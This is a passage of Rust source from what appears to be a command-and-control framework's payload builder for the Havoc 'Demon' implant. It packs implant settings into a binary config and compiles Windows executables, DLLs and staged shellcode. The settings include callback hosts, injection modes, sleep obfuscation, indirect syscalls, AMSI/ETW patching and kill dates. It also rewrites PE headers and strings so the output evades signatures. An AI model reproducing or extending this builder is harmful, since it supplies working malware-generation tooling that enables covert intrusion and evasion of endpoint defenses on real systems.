    let mut parts = token.splitn(3, '.');
    let major = parts.next()?.parse::<u32>().ok()?;
    let minor = parts.next().and_then(|s| s.parse::<u32>().ok()).unwrap_or(0);
    let patch = parts.next().and_then(|s| s.parse::<u32>().ok()).unwrap_or(0);
    Some((major, minor, patch))
}

/// Extract a version from GCC `--version` output.
///
/// GCC emits a first line like:
/// `x86_64-w64-mingw32-gcc (GCC) 12.2.0 20220819 (Release)`
fn parse_gcc_version(output: &str, path: &Path) -> Result<ToolchainVersion, PayloadBuildError> {
    let first_line = output.lines().next().unwrap_or("").trim();
    let token = first_line
        .split_whitespace()
        .find(|t| t.chars().next().is_some_and(|c| c.is_ascii_digit()) && t.contains('.'))
        .ok_or_else(|| PayloadBuildError::ToolchainUnavailable {
            message: format!(
                "could not parse version from `{} --version` output: {:?}",
                path.display(),
                first_line
            ),
        })?;
    let (major, minor, patch) =
        parse_version_triple(token).ok_or_else(|| PayloadBuildError::ToolchainUnavailable {
            message: format!(
                "invalid version string `{token}` from `{} --version`",
                path.display()
            ),
        })?;
    Ok(ToolchainVersion { major, minor, patch, raw: token.to_owned() })
}

/// Extract a version from NASM `--version` output.
///
/// NASM emits a first line like: `NASM version 2.16.01 compiled on ...`
fn parse_nasm_version(output: &str, path: &Path) -> Result<ToolchainVersion, PayloadBuildError> {
    let first_line = output.lines().next().unwrap_or("").trim();
    let token = first_line
        .split_whitespace()
        .find(|t| t.chars().next().is_some_and(|c| c.is_ascii_digit()) && t.contains('.'))
        .ok_or_else(|| PayloadBuildError::ToolchainUnavailable {
            message: format!(
                "could not parse version from `{} --version` output: {:?}",
                path.display(),
                first_line
            ),
        })?;
    let (major, minor, patch) =
        parse_version_triple(token).ok_or_else(|| PayloadBuildError::ToolchainUnavailable {
            message: format!(
                "invalid version string `{token}` from `{} --version`",
                path.display()
            ),
        })?;
    Ok(ToolchainVersion { major, minor, patch, raw: token.to_owned() })
}

/// Run `path --version`, parse with `parse_fn`, and enforce `requirement`.
fn verify_tool_version(
    path: &Path,
    parse_fn: fn(&str, &Path) -> Result<ToolchainVersion, PayloadBuildError>,
    requirement: &VersionRequirement,
) -> Result<ToolchainVersion, PayloadBuildError> {
    let output = std::process::Command::new(path).arg("--version").output().map_err(|err| {
        PayloadBuildError::ToolchainUnavailable {
            message: format!("failed to run `{} --version`: {err}", path.display()),
        }
    })?;
    let stdout = String::from_utf8_lossy(&output.stdout);
    let version = parse_fn(&stdout, path)?;
    if requirement.is_satisfied_by(&version) {
        Ok(version)
    } else {
        Err(PayloadBuildError::ToolchainUnavailable {
            message: format!(
                "`{}` version {} is below the minimum required {}.{}",
                path.display(),
                version,
                requirement.major,
                requirement.minor,
            ),
        })
    }
}

fn merged_request_config(
    input: &str,
    defaults: &DemonConfig,
) -> Result<Map<String, Value>, PayloadBuildError> {
    let mut config = match serde_json::from_str::<Value>(input)? {
        Value::Object(map) => map,
        _ => {
            return Err(PayloadBuildError::InvalidRequest {
                message: "build config must be a JSON object".to_owned(),
            });
        }
    };

    insert_default_string(&mut config, "Sleep", defaults.sleep.map(|value| value.to_string()));
    insert_default_string(&mut config, "Jitter", defaults.jitter.map(|value| value.to_string()));
    insert_default_bool(&mut config, "Indirect Syscall", defaults.indirect_syscall);
    insert_default_bool(&mut config, "Stack Duplication", defaults.stack_duplication);
    insert_default_string(&mut config, "Sleep Technique", defaults.sleep_technique.clone());
    insert_default_string(&mut config, "Proxy Loading", defaults.proxy_loading.clone());
    insert_default_string(&mut config, "Amsi/Etw Patch", defaults.amsi_etw_patching.clone());
    if let Some(injection) = &defaults.injection {
        let entry =
            config.entry("Injection".to_owned()).or_insert_with(|| Value::Object(Map::new()));
        if let Value::Object(map) = entry {
            if !map.contains_key("Spawn64") {
                if let Some(spawn64) = &injection.spawn64 {
                    map.insert("Spawn64".to_owned(), Value::String(spawn64.clone()));
                }
            }
            if !map.contains_key("Spawn32") {
                if let Some(spawn32) = &injection.spawn32 {
                    map.insert("Spawn32".to_owned(), Value::String(spawn32.clone()));
                }
            }
        }
    }

    Ok(config)
}

fn insert_default_string(config: &mut Map<String, Value>, key: &str, value: Option<String>) {
    if !config.contains_key(key) {
        if let Some(value) = value {
            config.insert(key.to_owned(), Value::String(value));
        }
    }
}

fn insert_default_bool(config: &mut Map<String, Value>, key: &str, value: bool) {
    if value && !config.contains_key(key) {
        config.insert(key.to_owned(), Value::Bool(true));
    }
}

/// HTTP methods that the Demon implant supports for C2 callbacks.
///
/// Demon callbacks carry an encrypted body, so only methods that allow a
/// request body are valid.  The Havoc reference implementation uses POST
/// exclusively; extend this list only after verifying Demon-side support.
const DEMON_SUPPORTED_HTTP_METHODS: &[&str] = &["POST"];

fn pack_config(
    listener: &ListenerConfig,
    config: &Map<String, Value>,
) -> Result<Vec<u8>, PayloadBuildError> {
    let sleep = required_u32(config, "Sleep")?;
    let jitter = required_u32(config, "Jitter")?;
    if jitter > 100 {
        return Err(PayloadBuildError::InvalidRequest {
            message: "Jitter has to be between 0 and 100".to_owned(),
        });
    }

    let mut out = Vec::new();
    add_u32(&mut out, sleep);
    add_u32(&mut out, jitter);

    let injection = required_object(config, "Injection")?;
    add_u32(&mut out, injection_mode(injection, "Alloc")?);
    add_u32(&mut out, injection_mode(injection, "Execute")?);
    add_wstring(&mut out, required_string(injection, "Spawn64")?)?;
    add_wstring(&mut out, required_string(injection, "Spawn32")?)?;

    let sleep_technique = required_string(config, "Sleep Technique")?;
    let obfuscation = sleep_obfuscation_value(sleep_technique);
    add_u32(&mut out, obfuscation);
    add_u32(&mut out, sleep_jump_bypass(obfuscation, optional_string(config, "Sleep Jmp Gadget"))?);
    add_u32(
        &mut out,
        if obfuscation == 0 {
            0
        } else if optional_bool(config, "Stack Duplication").unwrap_or(false) {
            1
        } else {
            0
        },
    );
    add_u32(&mut out, proxy_loading_value(optional_string(config, "Proxy Loading")));
    add_u32(
        &mut out,
        if optional_bool(config, "Indirect Syscall").unwrap_or(false) { 1 } else { 0 },
    );
    add_u32(&mut out, amsi_patch_value(optional_string(config, "Amsi/Etw Patch")));

    match listener {
        ListenerConfig::Http(http) => pack_http_listener(&mut out, http)?,
        ListenerConfig::Smb(smb) => pack_smb_listener(&mut out, smb)?,
        ListenerConfig::Dns(_) | ListenerConfig::External(_) => {
            return Err(PayloadBuildError::InvalidRequest {
                message: format!(
                    "{} listeners are not supported for Demon payload builds",
                    listener.protocol()
                ),
            });
        }
    }
    Ok(out)
}

fn pack_http_listener(
    out: &mut Vec<u8>,
    config: &HttpListenerConfig,
) -> Result<(), PayloadBuildError> {
    let port = config.port_conn.unwrap_or(config.port_bind);
    add_u64(out, parse_kill_date(config.kill_date.as_deref())?);
    add_u32(out, parse_working_hours(config.working_hours.as_deref())? as u32);

    let method = config.method.as_deref().unwrap_or("POST");
    if !DEMON_SUPPORTED_HTTP_METHODS.iter().any(|&m| method.eq_ignore_ascii_case(m)) {
        return Err(PayloadBuildError::InvalidRequest {
            message: format!(
                "HTTP method `{method}` is not supported for Demon payloads; \
                 supported: {}",
                DEMON_SUPPORTED_HTTP_METHODS.join(", ")
            ),
        });
    }
    add_wstring(out, &method.to_ascii_uppercase())?;
    add_u32(out, if config.host_rotation.eq_ignore_ascii_case("round-robin") { 0 } else { 1 });

    add_u32(
        out,
        u32::try_from(config.hosts.len()).map_err(|_| PayloadBuildError::InvalidRequest {
            message: "too many listener hosts configured".to_owned(),
        })?,
    );
    for host in &config.hosts {
        let (host_name, host_port) = host
            .rsplit_once(':')
            .and_then(|(host_name, port)| port.parse::<u16>().ok().map(|port| (host_name, port)))
            .unwrap_or((host.as_str(), port));
        add_wstring(out, host_name)?;
        add_u32(out, u32::from(host_port));
    }

    add_u32(out, if config.secure { 1 } else { 0 });
    add_wstring(out, config.user_agent.as_deref().unwrap_or_default())?;

    let mut headers = if config.headers.is_empty() {
        vec!["Content-type: */*".to_owned()]
    } else {
        config.headers.clone()
    };
    if let Some(host_header) = &config.host_header {
        headers.push(format!("Host: {host_header}"));
    }
    add_u32(
        out,
        u32::try_from(headers.len()).map_err(|_| PayloadBuildError::InvalidRequest {
            message: "too many HTTP headers configured".to_owned(),
        })?,
    );
    for header in headers {
        add_wstring(out, &header)?;
    }

    let uris = if config.uris.is_empty() { vec!["/".to_owned()] } else { config.uris.clone() };
    add_u32(
        out,
        u32::try_from(uris.len()).map_err(|_| PayloadBuildError::InvalidRequest {
            message: "too many URIs configured".to_owned(),
        })?,
    );
    for uri in uris {
        add_wstring(out, &uri)?;
    }

    match &config.proxy {
        Some(proxy) if proxy.enabled => {
            add_u32(out, 1);
            add_wstring(out, &proxy_url(proxy))?;
            add_wstring(out, proxy.username.as_deref().unwrap_or_default())?;
            add_wstring(out, proxy.password.as_deref().map(|s| s.as_str()).unwrap_or_default())?;
        }
        _ => add_u32(out, 0),
    }

    Ok(())
}

fn pack_smb_listener(
    out: &mut Vec<u8>,
    config: &red_cell_common::SmbListenerConfig,
) -> Result<(), PayloadBuildError> {
    add_wstring(out, &format!(r"\\.\pipe\{}", config.pipe_name))?;
    add_u64(out, parse_kill_date(config.kill_date.as_deref())?);
    add_u32(out, parse_working_hours(config.working_hours.as_deref())? as u32);
    Ok(())
}

fn build_defines(
    listener: &ListenerConfig,
    config_bytes: &[u8],
    shellcode_define: bool,
) -> Result<Vec<String>, PayloadBuildError> {
    let config_bytes_define = format!("CONFIG_BYTES={{{}}}", format_config_bytes(config_bytes));
    validate_define(&config_bytes_define)?;
    let mut defines = vec![config_bytes_define];
    let transport = match listener.protocol() {
        ListenerProtocol::Http => "TRANSPORT_HTTP",
        ListenerProtocol::Smb => "TRANSPORT_SMB",
        ListenerProtocol::Dns | ListenerProtocol::External => {
            return Err(PayloadBuildError::InvalidRequest {
                message: format!(
                    "{} listeners are not supported for Demon payload builds",
                    listener.protocol()
                ),
            });
        }
    };
    validate_define(transport)?;
    defines.push(transport.to_owned());
    if shellcode_define {
        validate_define("SHELLCODE")?;
        defines.push("SHELLCODE".to_owned());
    }
    Ok(defines)
}

/// Validates a compiler `-D` define string before it is passed to the compiler.
///
/// A valid define has the form `NAME` or `NAME=value` where:
/// - `NAME` contains only ASCII alphanumeric characters and underscores and begins
///   with a letter or underscore.
/// - The entire string contains no whitespace (a space-containing define would be
///   embedded as one argument but is almost certainly a bug or injection attempt).
/// - The entire string does not begin with `-` to prevent injecting extra compiler
///   flags.
fn validate_define(define: &str) -> Result<(), PayloadBuildError> {
    if define.is_empty() {
        return Err(PayloadBuildError::InvalidRequest {
            message: "compiler define must not be empty".to_owned(),
        });
    }
    if define.starts_with('-') {
        return Err(PayloadBuildError::InvalidRequest {
            message: format!("compiler define `{define}` must not begin with `-`"),
        });
    }
    if define.chars().any(|c| c.is_whitespace()) {
        return Err(PayloadBuildError::InvalidRequest {
            message: format!("compiler define `{define}` must not contain whitespace"),
        });
    }
    let name = define.split_once('=').map_or(define, |(n, _)| n);
    if name.is_empty()
        || !name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
        || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    {
        return Err(PayloadBuildError::InvalidRequest {
            message: format!(
                "compiler define name `{name}` must contain only ASCII alphanumeric characters \
                 and underscores and begin with a letter or underscore"
            ),
        });
    }
    Ok(())
}

fn format_config_bytes(bytes: &[u8]) -> String {
    bytes.iter().map(|byte| format!("0x{byte:02x}")).collect::<Vec<_>>().join("\\,")
}

/// Build the `-D` defines injected into the staged shellcode stager template.
///
/// Only HTTP listeners are supported: the stager makes an outbound HTTP(S) GET
/// request, which has no equivalent for SMB or DNS listeners.
fn build_stager_defines(listener: &ListenerConfig) -> Result<Vec<String>, PayloadBuildError> {
    let http = match listener {
        ListenerConfig::Http(http) => http,
        _ => {
            return Err(PayloadBuildError::InvalidRequest {
                message: "Windows Shellcode Staged requires an HTTP listener".to_owned(),
            });
        }
    };

    let host = http.hosts.first().ok_or_else(|| PayloadBuildError::InvalidRequest {
        message: "HTTP listener has no configured hosts".to_owned(),
    })?;
    let port = http.port_conn.unwrap_or(http.port_bind);
    let uri = http.uris.first().map(String::as_str).unwrap_or("/");

    // Embed host and URI as C byte-array initialisers so that no shell quoting
    // is needed and the values survive the -D argument intact.
    let host_bytes_with_nul: Vec<u8> = host.bytes().chain(std::iter::once(0u8)).collect();
    let uri_bytes_with_nul: Vec<u8> = uri.bytes().chain(std::iter::once(0u8)).collect();

    let host_define = format!("STAGER_HOST={{{}}}", format_config_bytes(&host_bytes_with_nul));
    let uri_define = format!("STAGER_URI={{{}}}", format_config_bytes(&uri_bytes_with_nul));
    let port_define = format!("STAGER_PORT={port}");
    let secure_define = format!("STAGER_SECURE={}", u8::from(http.secure));

    for define in [&host_define, &uri_define, &port_define, &secure_define] {
        validate_define(define)?;
    }

    Ok(vec![host_define, uri_define, port_define, secure_define])
}

/// Serialise the listener connection parameters into a byte string used as the
/// staged shellcode cache key.
///
/// Only the fields that determine the compiled stager binary are included:
/// host, port, URI, and the HTTPS flag.
fn stager_cache_bytes(listener: &ListenerConfig) -> Result<Vec<u8>, PayloadBuildError> {
    let http = match listener {
        ListenerConfig::Http(http) => http,
        _ => {
            return Err(PayloadBuildError::InvalidRequest {
                message: "Windows Shellcode Staged requires an HTTP listener".to_owned(),
            });
        }
    };

    let host = http.hosts.first().ok_or_else(|| PayloadBuildError::InvalidRequest {
        message: "HTTP listener has no configured hosts".to_owned(),
    })?;
    let port = http.port_conn.unwrap_or(http.port_bind);
    let uri = http.uris.first().map(String::as_str).unwrap_or("/");

    let mut out = Vec::new();
    out.extend_from_slice(host.as_bytes());
    out.push(0);
    out.extend_from_slice(&port.to_le_bytes());
    out.extend_from_slice(uri.as_bytes());
    out.push(0);
    out.push(u8::from(http.secure));
    Ok(out)
}

fn default_compiler_flags(format: OutputFormat) -> Vec<&'static str> {
    let mut flags = vec![
        "-Os",
        "-fno-asynchronous-unwind-tables",
        "-masm=intel",
        "-fno-ident",
        "-fpack-struct=8",
        "-falign-functions=1",
        "-s",
        "-ffunction-sections",
        "-fdata-sections",
        "-falign-jumps=1",
        "-w",
        "-falign-labels=1",
        "-fPIC",
    ];

    if format == OutputFormat::ServiceExe {
        flags.push("-mwindows");
        flags.push("-ladvapi32");
    } else {
        flags.push("-nostdlib");
        flags.push("-mwindows");
    }

    flags.push("-Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections");
    flags
}

fn main_args(architecture: Architecture, format: OutputFormat) -> Vec<&'static str> {
    match format {
        OutputFormat::Exe => vec![
            "-D",
            "MAIN_THREADED",
            "-e",
            if architecture == Architecture::X64 { "WinMain" } else { "_WinMain" },
            "src/main/MainExe.c",
        ],
        OutputFormat::ServiceExe => vec![
            "-D",
            "MAIN_THREADED",
            "-D",
            "SVC_EXE",
            "-lntdll",
            "-e",
            if architecture == Architecture::X64 { "WinMain" } else { "_WinMain" },
            "src/main/MainSvc.c",
        ],
        OutputFormat::Dll | OutputFormat::ReflectiveDll => vec![
            "-shared",
            "-e",
            if architecture == Architecture::X64 { "DllMain" } else { "_DllMain" },
            "src/main/MainDll.c",
        ],
        // These formats never reach compile_portable_executable:
        // Shellcode and RawShellcode compile a DLL then prepend a loader binary,
        // StagedShellcode is compiled by compile_stager via its own code path.
        OutputFormat::Shellcode | OutputFormat::RawShellcode | OutputFormat::StagedShellcode => {
            Vec::new()
        }
    }
}

/// Tag identifying which stream a line originated from.
enum StreamTag {
    Stdout,
    Stderr,
}

async fn run_command<F>(
    program: &Path,
    args: &[OsString],
    cwd: &Path,
    progress: &mut F,
) -> Result<(), PayloadBuildError>
where
    F: FnMut(BuildProgress),
{
    let command_line = std::iter::once(program.display().to_string())
        .chain(args.iter().map(|arg| arg.to_string_lossy().into_owned()))
        .collect::<Vec<_>>()
        .join(" ");
    progress(BuildProgress { level: "Info".to_owned(), message: command_line.clone() });

    let mut command = Command::new(program);
    command.args(args).current_dir(cwd).stdout(Stdio::piped()).stderr(Stdio::piped());
    let mut child = command.spawn()?;
    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| PayloadBuildError::Io(std::io::Error::other("missing child stdout")))?;
    let stderr = child
        .stderr
        .take()
        .ok_or_else(|| PayloadBuildError::Io(std::io::Error::other("missing child stderr")))?;

    // Use a tagged channel so stdout and stderr lines can be handled differently.
    // Stderr lines are collected for diagnostic parsing on failure.
    let (sender, mut receiver) = mpsc::unbounded_channel::<(StreamTag, String)>();
    let stdout_sender = sender.clone();
    let stderr_sender = sender;

    let stdout_task = tokio::spawn(async move {
        let mut lines = BufReader::new(stdout).lines();
        while let Some(line) = lines.next_line().await? {
            let _ = stdout_sender.send((StreamTag::Stdout, line));
        }
        Ok::<(), std::io::Error>(())
    });
    let stderr_task = tokio::spawn(async move {
        let mut lines = BufReader::new(stderr).lines();
        while let Some(line) = lines.next_line().await? {
            let _ = stderr_sender.send((StreamTag::Stderr, line));
        }
        Ok::<(), std::io::Error>(())
    });

    let mut stderr_lines: Vec<String> = Vec::new();
    while let Some((tag, line)) = receiver.recv().await {
        if line.trim().is_empty() {
            continue;
        }
        match tag {
            StreamTag::Stdout => {
                progress(BuildProgress { level: "Info".to_owned(), message: line });
            }
            StreamTag::Stderr => {
                stderr_lines.push(line.clone());
                // Forward stderr as a warning so the operator sees it in real time.
                progress(BuildProgress { level: "Warning".to_owned(), message: line });
            }
        }
    }

    let status = child.wait().await?;
    stdout_task.await.map_err(|source| PayloadBuildError::Io(std::io::Error::other(source)))??;
    stderr_task.await.map_err(|source| PayloadBuildError::Io(std::io::Error::other(source)))??;

    if status.success() {
        Ok(())
    } else {
        let diagnostics =
            stderr_lines.iter().filter_map(|l| parse_compiler_diagnostic(l)).collect();
        Err(PayloadBuildError::CommandFailed { command: command_line, diagnostics })
    }
}

/// Try to parse a single line of GCC or NASM compiler output as a structured diagnostic.
///
/// Handles the common format used by both compilers on Linux:
/// - `filename:line:col: severity: message`
/// - `filename:line: severity: message`
///
/// The optional flag that GCC appends at the end of warnings (`[-Wfoo]`) is
/// extracted as `error_code` when present.
pub fn parse_compiler_diagnostic(line: &str) -> Option<CompilerDiagnostic> {
    let line = line.trim_start();

    // Find the first colon that terminates the filename. On Linux, source paths
    // do not contain colons, so the first colon reliably marks the boundary.
    let first_colon = line.find(':')?;
    let filename = &line[..first_colon];
    if filename.is_empty() {
        return None;
    }

    // After the first colon: line-number[:col]: severity: message
    let after_filename = &line[first_colon + 1..];
    let second_colon = after_filename.find(':')?;
    let line_num: u32 = after_filename[..second_colon].trim().parse().ok()?;

    // What follows the line number colon may be either a column number or the severity.
    let after_line = &after_filename[second_colon + 1..];
    let (column, severity_text) = {
        if let Some(next_colon) = after_line.find(':') {
            let candidate = after_line[..next_colon].trim();
            if let Ok(col) = candidate.parse::<u32>() {
                (Some(col), after_line[next_colon + 1..].trim_start())
            } else {
                (None, after_line.trim_start())
            }
        } else {
            (None, after_line.trim_start())
        }
    };

    // Severity is one of the known GCC/NASM severity labels.
    const SEVERITIES: &[&str] = &["fatal error", "error", "warning", "note"];
    let (severity, rest_after_severity) = SEVERITIES
        .iter()
        .find_map(|&sev| severity_text.strip_prefix(sev).map(|rest| (sev, rest)))?;

    // After the severity there must be a `: message`.
    let message_raw = rest_after_severity.trim_start().strip_prefix(':')?.trim();
    if message_raw.is_empty() {
        return None;
    }

    // GCC appends the triggering flag in brackets at the end of warnings, e.g.
    // `unused variable 'x' [-Wunused-variable]`.  Extract it as error_code.
    let (message, error_code) = extract_gcc_flag(message_raw);

    Some(CompilerDiagnostic {
        filename: filename.to_owned(),
        line: line_num,
        column,
        severity: severity.to_owned(),
        error_code,
        message,
    })
}

/// Extract a trailing GCC diagnostic flag from a message, if present.
///
/// GCC appends flags in the form `[-Wfoo]` or `[-Werror=foo]` at the end of
/// warning/error messages.  Returns `(message_without_flag, Some(flag))` when
/// the pattern is matched, or `(message, None)` otherwise.
fn extract_gcc_flag(message: &str) -> (String, Option<String>) {
    let trimmed = message.trim();
    if trimmed.ends_with(']') {
        if let Some(bracket_start) = trimmed.rfind('[') {
            let flag = &trimmed[bracket_start + 1..trimmed.len() - 1];
            if flag.starts_with('-') {
                let msg = trimmed[..bracket_start].trim().to_owned();
                return (msg, Some(flag.to_owned()));
            }
        }
    }
    (trimmed.to_owned(), None)
}

fn c_sources(source_root: &Path) -> Result<Vec<PathBuf>, PayloadBuildError> {
    let mut sources = Vec::new();
    for dir in ["src/core", "src/crypt", "src/inject", "src/asm"] {
        let mut entries = std::fs::read_dir(source_root.join(dir))?
            .collect::<Result<Vec<_>, _>>()?
            .into_iter()
            .map(|entry| entry.path())
            .filter(|path| path.extension().and_then(|value| value.to_str()) == Some("c"))
            .collect::<Vec<_>>();
        entries.sort();
        sources.extend(entries);
    }
    Ok(sources)
}

fn asm_sources(
    source_root: &Path,
    architecture: Architecture,
) -> Result<Vec<PathBuf>, PayloadBuildError> {
    let suffix = match architecture {
        Architecture::X64 => ".x64.asm",
        Architecture::X86 => ".x86.asm",
    };
    let mut entries = std::fs::read_dir(source_root.join("src/asm"))?
        .collect::<Result<Vec<_>, _>>()?
        .into_iter()
        .map(|entry| entry.path())
        .filter(|path| {
            path.file_name()
                .and_then(|value| value.to_str())
                .is_some_and(|name| name.contains(suffix))
        })
        .collect::<Vec<_>>();
    entries.sort();
    Ok(entries)
}

fn patch_payload(
    mut bytes: Vec<u8>,
    architecture: Architecture,
    binary_patch: &BinaryConfig,
) -> Result<Vec<u8>, PayloadBuildError> {
    // Validate PE structure before applying any patches.  A failed build step
    // may produce an ELF, error output, or a truncated file; writing PE header
    // fields into such a binary would silently corrupt it with no diagnostic.
    const MZ_MAGIC: [u8; 2] = [0x4D, 0x5A];
    if bytes.len() < 2 || bytes[..2] != MZ_MAGIC {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload does not start with MZ magic bytes — not a valid PE binary"
                .to_owned(),
        });
    }
    // pe_offsets validates the PE\0\0 signature at the DOS header pointer (0x3C).
    pe_offsets(&bytes)?;

    let header = binary_patch.header.as_ref();
    let magic = match architecture {
        Architecture::X64 => header.and_then(|header| header.magic_mz_x64.as_deref()),
        Architecture::X86 => header.and_then(|header| header.magic_mz_x86.as_deref()),
    };
    if let Some(magic) = magic {
        let patch = magic.as_bytes();
        if patch.len() > bytes.len() {
            return Err(PayloadBuildError::InvalidRequest {
                message: "binary patch header is larger than the payload".to_owned(),
            });
        }
        bytes[..patch.len()].copy_from_slice(patch);
    }

    if let Some(header) = &binary_patch.header {
        if let Some(compile_time) = header.compile_time.as_deref() {
            let timestamp = parse_header_u32_field("CompileTime", compile_time)?;
            write_pe_file_header_timestamp(&mut bytes, timestamp)?;
        }

        let image_size = match architecture {
            Architecture::X64 => header.image_size_x64,
            Architecture::X86 => header.image_size_x86,
        };
        if let Some(image_size) = image_size {
            write_pe_optional_header_image_size(&mut bytes, image_size)?;
        }
    }

    let replacements = match architecture {
        Architecture::X64 => &binary_patch.replace_strings_x64,
        Architecture::X86 => &binary_patch.replace_strings_x86,
    };
    for (old, new) in replacements {
        let mut replacement = new.as_bytes().to_vec();
        if replacement.len() > old.len() {
            return Err(PayloadBuildError::InvalidRequest {
                message: format!("replacement value `{new}` is longer than search string `{old}`"),
            });
        }
        replacement.resize(old.len(), 0);
        bytes = replace_all(bytes, old.as_bytes(), &replacement);
    }

    Ok(bytes)
}

fn parse_header_u32_field(field_name: &str, value: &str) -> Result<u32, PayloadBuildError> {
    let trimmed = value.trim();
    let parsed =
        if let Some(hex) = trimmed.strip_prefix("0x").or_else(|| trimmed.strip_prefix("0X")) {
            u32::from_str_radix(hex, 16)
        } else {
            trimmed.parse::<u32>()
        };

    parsed.map_err(|_| PayloadBuildError::InvalidRequest {
        message: format!("{field_name} `{trimmed}` must be a valid u32 value"),
    })
}

fn pe_offsets(bytes: &[u8]) -> Result<(usize, usize), PayloadBuildError> {
    const DOS_HEADER_PE_POINTER_OFFSET: usize = 0x3C;
    const PE_SIGNATURE_SIZE: usize = 4;
    const FILE_HEADER_SIZE: usize = 20;

    if bytes.len() < DOS_HEADER_PE_POINTER_OFFSET + 4 {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload is too small to contain a PE header".to_owned(),
        });
    }

    let pe_offset = u32::from_le_bytes(
        bytes[DOS_HEADER_PE_POINTER_OFFSET..DOS_HEADER_PE_POINTER_OFFSET + 4].try_into().map_err(
            |_| PayloadBuildError::InvalidRequest {
                message: "payload is too small to contain a PE header".to_owned(),
            },
        )?,
    );
    let pe_offset = usize::try_from(pe_offset).map_err(|_| PayloadBuildError::InvalidRequest {
        message: "payload PE header offset does not fit in memory".to_owned(),
    })?;

    if bytes.len() < pe_offset + PE_SIGNATURE_SIZE + FILE_HEADER_SIZE {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload PE header is truncated".to_owned(),
        });
    }

    if bytes[pe_offset..pe_offset + PE_SIGNATURE_SIZE] != *b"PE\0\0" {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload does not contain a valid PE signature".to_owned(),
        });
    }

    let optional_header_offset = pe_offset + PE_SIGNATURE_SIZE + FILE_HEADER_SIZE;
    if bytes.len() < optional_header_offset + 60 {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload PE optional header is truncated".to_owned(),
        });
    }

    Ok((pe_offset, optional_header_offset))
}

fn write_pe_file_header_timestamp(
    bytes: &mut [u8],
    timestamp: u32,
) -> Result<(), PayloadBuildError> {
    let (pe_offset, _) = pe_offsets(bytes)?;
    let timestamp_offset = pe_offset + 8;
    bytes[timestamp_offset..timestamp_offset + 4].copy_from_slice(&timestamp.to_le_bytes());
    Ok(())
}

fn write_pe_optional_header_image_size(
    bytes: &mut [u8],
    image_size: u32,
) -> Result<(), PayloadBuildError> {
    let (_, optional_header_offset) = pe_offsets(bytes)?;
    let image_size_offset = optional_header_offset + 56;
    bytes[image_size_offset..image_size_offset + 4].copy_from_slice(&image_size.to_le_bytes());
    Ok(())
}

fn replace_all(mut haystack: Vec<u8>, needle: &[u8], replacement: &[u8]) -> Vec<u8> {
    if needle.is_empty() {
        return haystack;
    }

    let mut offset = 0;
    while let Some(position) =
        haystack[offset..].windows(needle.len()).position(|window| window == needle)
    {
        let start = offset + position;
        haystack[start..start + needle.len()].copy_from_slice(replacement);
        offset = start + replacement.len();
    }
    haystack
}

fn required_object<'a>(
    config: &'a Map<String, Value>,
    key: &str,
) -> Result<&'a Map<String, Value>, PayloadBuildError> {
    config
        .get(key)
        .and_then(Value::as_object)
        .ok_or_else(|| PayloadBuildError::InvalidRequest { message: format!("{key} is undefined") })
}

fn required_string<'a>(
    config: &'a Map<String, Value>,
    key: &str,
) -> Result<&'a str, PayloadBuildError> {
    optional_string(config, key)
        .ok_or_else(|| PayloadBuildError::InvalidRequest { message: format!("{key} is undefined") })
}

fn optional_string<'a>(config: &'a Map<String, Value>, key: &str) -> Option<&'a str> {
    config
        .get(key)
        .and_then(|value| value.as_str())
        .map(str::trim)
        .filter(|value| !value.is_empty())
}

fn optional_bool(config: &Map<String, Value>, key: &str) -> Option<bool> {
    config.get(key).and_then(Value::as_bool)
}

fn required_u32(config: &Map<String, Value>, key: &str) -> Result<u32, PayloadBuildError> {
    match config.get(key) {
        Some(Value::String(value)) => value.trim().parse::<u32>().map_err(|_| {
            PayloadBuildError::InvalidRequest { message: format!("{key} must be a valid integer") }
        }),
        Some(Value::Number(value)) => {
            value.as_u64().and_then(|value| u32::try_from(value).ok()).ok_or_else(|| {
                PayloadBuildError::InvalidRequest { message: format!("{key} must fit in u32") }
            })
        }
        _ => Err(PayloadBuildError::InvalidRequest { message: format!("{key} is undefined") }),
    }
}

fn injection_mode(config: &Map<String, Value>, key: &str) -> Result<u32, PayloadBuildError> {
    match required_string(config, key)? {
        "Win32" => Ok(1),
        "Native/Syscall" => Ok(2),
        _ => Ok(0),
    }
}

fn sleep_obfuscation_value(value: &str) -> u32 {
    match value {
        "Foliage" => 3,
        "Ekko" => 1,
        "Zilean" => 2,
        _ => 0,
    }
}

fn sleep_jump_bypass(obfuscation: u32, value: Option<&str>) -> Result<u32, PayloadBuildError> {
    if obfuscation == 0 {
        return Ok(0);
    }
    Ok(match value.unwrap_or_default() {
        "jmp rax" => 1,
        "jmp rbx" => 2,
        _ => 0,
    })
}

fn proxy_loading_value(value: Option<&str>) -> u32 {
    match value.unwrap_or("None (LdrLoadDll)") {
        "RtlRegisterWait" => 1,
        "RtlCreateTimer" => 2,
        "RtlQueueWorkItem" => 3,
        _ => 0,
    }
}

fn amsi_patch_value(value: Option<&str>) -> u32 {
    match value.unwrap_or_default() {
        "Hardware breakpoints" => 1,
        "Memory" => 2,
        _ => 0,
    }
}

fn parse_kill_date(value: Option<&str>) -> Result<u64, PayloadBuildError> {
    let Some(raw) = value.map(str::trim).filter(|value| !value.is_empty()) else {
        return Ok(0);
    };
    let epoch = red_cell_common::parse_kill_date_to_epoch(raw)
        .map_err(|err| PayloadBuildError::InvalidRequest { message: err.to_string() })?;
    u64::try_from(epoch).map_err(|_| PayloadBuildError::InvalidRequest {
        message: format!("KillDate `{raw}` must be a non-negative unix timestamp"),
    })
}

fn parse_working_hours(value: Option<&str>) -> Result<i32, PayloadBuildError> {
    let Some(value) = value.map(str::trim).filter(|value| !value.is_empty()) else {
        return Ok(0);
    };

    let (start, end) = value.split_once('-').ok_or_else(|| PayloadBuildError::InvalidRequest {
        message: "WorkingHours must use `HH:MM-HH:MM`".to_owned(),
    })?;
    let (start_hour, start_minute) = parse_hour_minute(start)?;
    let (end_hour, end_minute) = parse_hour_minute(end)?;
    if end_hour < start_hour || (end_hour == start_hour && end_minute <= start_minute) {
        return Err(PayloadBuildError::InvalidRequest {
            message: "WorkingHours end must be after the start".to_owned(),
        });
    }

    let mut packed = 0_i32;
